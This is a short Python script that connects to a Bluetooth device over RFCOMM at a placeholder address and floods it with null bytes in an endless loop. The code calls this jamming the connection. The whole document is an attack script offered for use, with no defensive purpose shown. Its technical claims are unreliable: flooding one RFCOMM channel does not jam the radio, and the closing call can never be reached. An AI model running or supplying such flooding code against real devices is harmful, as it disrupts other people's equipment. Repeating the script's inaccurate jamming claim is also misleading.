import bluetooth

# Set the device's MAC address and port
target_address = "00:11:22:33:44:55"
port = 1

# Create a socket and connect to the target device
sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
sock.connect((target_address, port))

# Send a continuous stream of data to jam the Bluetooth connection
while True:
    sock.send(b"\x00" * 1024)  # Send a block of 1024 null bytes

# Close the socket when done
sock.close()
